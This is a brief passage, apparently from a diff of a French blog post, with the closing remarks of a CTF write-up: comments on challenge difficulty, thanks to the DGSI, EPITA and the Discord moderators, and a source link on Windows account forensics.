+<p>Seul la grosse différence de niveau entre les deux (alors qu&rsquo;il sont classés comme Medium) et la fin qui sort un peu du &ldquo;scope&rdquo; donné par l&rsquo;énoncé viennent noircir un peu le tableau.</p>
+<p>En tout cas je remercie la DGSI, EPITA, les modérateurs Discord (cc Clar&rsquo;hacker !) ainsi que toutes les personnes ayant travaillés sur le CTF, je le ferais avec plaisir l&rsquo;année provhaine !</p>
 <h2 id="sources">Sources</h2>
 <ul>
 <li><a href="https://cybermeisam.medium.com/blue-team-system-live-analysis-part-8-windows-user-account-forensics-profile-folder-appdata-7f07a0870584">https://cybermeisam.medium.com/blue-team-system-live-analysis-part-8-windows-user-account-forensics-profile-folder-appdata-7f07a0870584</a></li>
